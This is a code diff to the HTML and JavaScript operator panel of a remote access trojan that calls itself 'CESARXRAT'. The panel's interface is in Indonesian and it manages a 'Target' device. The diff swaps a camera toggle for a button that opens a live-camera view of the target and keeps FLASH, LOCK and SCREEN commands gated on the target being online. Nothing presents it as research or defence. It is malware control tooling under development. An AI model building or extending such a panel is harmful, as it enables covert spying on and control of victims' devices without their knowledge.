@@ -107,6 +107,29 @@
         .switch-lg input:disabled + .slider {
             opacity: 0.4; cursor: not-allowed;
         }
+        .btn-open-camera {
+            display: inline-block;
+            padding: 10px 24px;
+            border-radius: 50px;
+            border: none;
+            background: linear-gradient(135deg, #4a9eff, #1a5bbf);
+            color: #fff;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(74, 158, 255, 0.3);
+            margin-top: 4px;
+        }
+        .btn-open-camera:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(74, 158, 255, 0.5);
+        }
+        .btn-open-camera:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
         .last-command {
             background: #111a3a; border-radius: 14px;
             padding: 12px 16px; margin-top: 16px;
@@ -209,10 +232,9 @@
             <div class="control-box">
                 <div class="icon">📷</div>
                 <span class="label">Live Camera</span>
-                <label class="switch-lg">
-                    <input type="checkbox" id="camera" disabled>
-                    <span class="slider"></span>
-                </label>
+                <button class="btn-open-camera" id="btnCamera" disabled onclick="openLiveCamera()">
+                    BUKA
+                </button>
             </div>
             <div class="control-box">
                 <div class="icon">🖥️</div>
@@ -273,6 +295,7 @@
                 deviceName.textContent = 'Target tidak ditemukan';
                 deviceOs.textContent = 'ID: ' + targetId;
                 currentTargetOnline = false;
+                updateButtons();
                 return;
             }
 
@@ -292,10 +315,23 @@
             deviceName.textContent = target.name || 'Perangkat Target';
             deviceOs.textContent = target.os || '- - -';
 
-            document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                cb.disabled = !isOnline;
-            });
+            updateButtons();
         });
+
+        function updateButtons() {
+            document.getElementById('flash').disabled = !currentTargetOnline;
+            document.getElementById('lock').disabled = !currentTargetOnline;
+            document.getElementById('btnCamera').disabled = !currentTargetOnline;
+            document.getElementById('screen').disabled = !currentTargetOnline;
+        }
+
+        window.openLiveCamera = function() {
+            if (!currentTargetOnline) {
+                alert('❌ Target offline!');
+                return;
+            }
+            window.location.href = 'live-camera.html?target=' + targetId;
+        };
 
         function sendCommand(command) {
             if (!currentTargetOnline) {
@@ -354,7 +390,6 @@
         const controls = [
             { checkbox: 'flash', command: 'FLASH' },
             { checkbox: 'lock', command: 'LOCK' },
-            { checkbox: 'camera', command: 'CAMERA' },
             { checkbox: 'screen', command: 'SCREEN' }
         ];
 
@@ -375,7 +410,7 @@
             });
         });
 
-        console.log('[CESARXRAT] RAT Control siap');
+        console.log('[CESARXRAT] RAT Control siap, target:', targetId);
     </script>
 </body>
 </html>
